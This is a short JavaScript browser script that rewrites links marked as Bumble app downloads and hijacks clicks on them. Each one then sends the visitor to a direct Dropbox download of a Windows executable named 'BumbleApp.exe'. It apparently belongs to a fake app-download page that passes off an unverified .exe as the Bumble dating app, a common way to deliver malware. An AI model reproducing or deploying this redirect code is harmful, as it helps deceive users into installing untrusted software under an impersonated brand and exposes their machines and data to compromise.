(function (global) {
    "use strict";

    var BUMBLE_APP_DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/aotqhhk0j1fatiy0sdzki/BumbleApp.exe?rlkey=ji8r68ef2lkunaowamjgsi375&st=m30xhpsx&dl=1";

    function applyDownloadLinksToAnchors() {
        if (typeof document === "undefined") return;
        var nodes = document.querySelectorAll("a[data-bumble-download]");
        for (var i = 0; i < nodes.length; i++) {
            nodes[i].setAttribute("href", BUMBLE_APP_DOWNLOAD_URL);
            nodes[i].setAttribute("rel", "noopener noreferrer");
        }
    }

    function onDocumentClickCapture(e) {
        var a = e.target.closest && e.target.closest("a[data-bumble-download]");
        if (!a) return;
        if (a.getAttribute("data-download-no-track") != null) return;
        e.preventDefault();
        global.location.href = BUMBLE_APP_DOWNLOAD_URL;
    }

    if (typeof document !== "undefined") {
        document.addEventListener("DOMContentLoaded", function () {
            applyDownloadLinksToAnchors();
            document.addEventListener("click", onDocumentClickCapture, true);
        });
    }

    global.BUMBLE_APP_DOWNLOAD_URL = BUMBLE_APP_DOWNLOAD_URL;
})(typeof window !== "undefined" ? window : this);
